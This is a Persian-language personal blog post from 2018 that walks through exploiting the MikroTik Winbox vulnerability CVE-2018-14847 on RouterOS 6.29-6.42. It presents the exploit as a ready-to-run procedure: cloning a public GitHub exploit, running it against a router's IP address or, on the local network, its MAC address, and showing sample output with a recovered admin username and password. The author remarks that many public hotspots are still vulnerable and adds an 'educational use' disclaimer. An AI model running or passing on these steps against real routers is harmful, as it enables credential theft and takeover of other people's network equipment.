<!DOCTYPE html>
<html>

    <head>
        <title> استفاده از ضعف امنیتی winbox میکروتیک &middot; amir@amirhne:~$ </title>

        <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.54.0" />


<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>


<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">


<link rel="stylesheet" href="https://amirhne.me/css/nix.css">


<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">

<link href="https://fonts.googleapis.com/css?family=Amiri" rel="stylesheet">




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-89500622-2', 'auto');
	  ga('send', 'pageview');

</script>
<link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/img/favicon-16x16.png">
<link rel="manifest" href="/img/site.webmanifest">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">


    </head>

    <body>
        <header>
<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
	<div class="container-fluid">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand" id="green-terminal" href=https://amirhne.me/>amir@amirhne ~ $</a>
		</div>

		
		<div class="collapse navbar-collapse" id="navbar-collapse-1">
			<ul class="nav navbar-nav navbar-right">
				<li>
					<a href="https://amirhne.me/">/home/amir</a>
				</li>
				
				
				<li >
					<a href="/blog">~/blog</a>
				</li>
				
				
				<li >
					<a href="/en">~/en</a>
				</li>
				
				
				<li >
					<a href="https://www.imdb.com/list/ls064428229/">~/imdb.list</a>
				</li>
				
				
				<li >
					<a href="/quotes">~/quotes</a>
				</li>
				
				
				<li >
					<a href="http://resume.amirhne.me">~/resume</a>
				</li>
				

			</ul>
		</div>
	</div>
</nav>
</header>

        <div dir="rtl" class="container wrapper">
            <h1 class="post-title-single-custom"><a href="https://amirhne.me/tech/mikrotik-winbox-exploit/">استفاده از ضعف امنیتی winbox میکروتیک</a></h1>
            <span class="post-date">Aug 9, 2018 </span>
            <br>
            <br>
                        <div class="post-content">
                <p>این اواخر خبری منتشر شد مبنی بر اینکه وبسایت زرین پال هدف حمله قرار گرفته است و در طی گزارش فنی که منتشر شد و من مطالعه کردم، مشخص شد که این حمله فقط در لایه شبکه و به یکی از روتر های میکروتیک لبه (Edge) و با استفاده از ضعف امنیتی <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-14847">CVE-2018-14847</a> بوده است.</p>

<p>حفره امنیتی که مورد استفاده این مهاجمین قرار گرفته بوده است، میتوان گفت مدت زیادی است که از طرف میکروتیک اعلام شده است و آپدیت RouterOS جدید به سرعت از سمت میکروتیک برای استفاده قرار داده شده است. اما خیلی از ادمین ها شبکه هنوز خیلی از تجهیزات خود را بروزرسانی نکرده اند و به شخصه این حفره امنیتی رو در خیلی از هات اسپات ها عمومی که میکروتیک هستند، مشاهده کرده ام.</p>

<p>در ادامه قصد دارم استفاده از این حفره امنیتی رو معرفی کنم که بسیار مناسب برای استفاده برای وصل شدن به تجهیزات میکروتیک قدیمی که پسوردهاشون رو فراموش کردیم هست و این مطلب برای <strong>استفاده های آموزشی در اینجا قرار داده شده است</strong> و هیچ مسئولیتی بر قبال استفاده نادرست از این آموزش بر عهده اینجانب نمی باشد.</p>

<p>لازم به ذکر است که برای استفاده از این حفره امنیتی بایستی RouterOS میکروتیک نسخه های 6.29 تا 6.42 باشد. در ادامه یکی از اسکریپت های خوب برای استفاده از این حفره که در Github پیدا کردم را معرفی میکنم. همچنین برای استفاده از این روش بایستی git و python3 را بر روی سیستم عامل مورد استفاده خود داشته باشید که من پیشنهادم استفاده از یکی از توزیع های لینوکس هست و دستوراتی را که در ادامه میگم، قابل اجرا در محیط دستوری لینوکس هست. البته اگر زبانتان هم خوب هست تمام این توضیحات من در <a href="https://github.com/BigNerd95/WinboxExploit">اینجا</a> به انگلیسی سلیس بیان شده است.
این حمله هم در لایه 2 و هم در لایه 3 قابلیت اجرا را دارد.</p>

<p>1 . ملزومات:</p>

<ul>
<li>دسترسی به روتر در لایه 3 (با IP) یا لایه 2 (با مک آدرس)</li>
<li>باز بودن winbox و پورت مورد استفاده (پیشفرض tcp 8291) روی روتر از جایی که دسترسی به روتر وجود دارد</li>
<li>سیستم عامل RouterOS بین 6.29 و 6.42</li>
<li>نرم افزار winbox، و نصب بودن git، python3</li>
</ul>

<p>2 . اجرا:</p>

<ul>
<li>دانلود اسکریپت از Github</li>
</ul>

<pre><code>git clone https://github.com/BigNerd95/WinboxExploit.git
cd WinboxExploit/

</code></pre>

<ul>
<li>اجرای اسکریپت در لایه 3</li>
</ul>

<pre><code>$ python3 WinboxExploit.py {Mikrotik Router IP}

User: admin
Pass: 1234wq

</code></pre>

<ul>
<li>پیدا کردن مک آدرس روتر در لایه 2</li>
</ul>

<pre><code>$ python3 MACServerDiscover.py
Looking for Mikrotik devices (MAC servers)

    aa:bb:cc:dd:ee:ff 

    aa:bb:cc:dd:ee:aa
</code></pre>

<ul>
<li>اجرای اسکریپت در لایه 2</li>
</ul>

<pre><code>$ python3 MACServerExploit.py {Mikrotik Router MAC}

User: admin
Pass: 1234wq
</code></pre>

<p>در صورتی که در Broadcast Domain روتر میکروتیک قرار دارید،‌ دیگر نیازی به باز بودن پورت winbox نمی باشد و با مک آدرس امکان وصل شدن وجود دارد.</p>

            </div>
            
 
            
            <div class="push"></div>
        </div>
        <footer class="footer text-center">
<p>Copyright &copy; 2019 amirhne
</p>
</footer>

    </body>
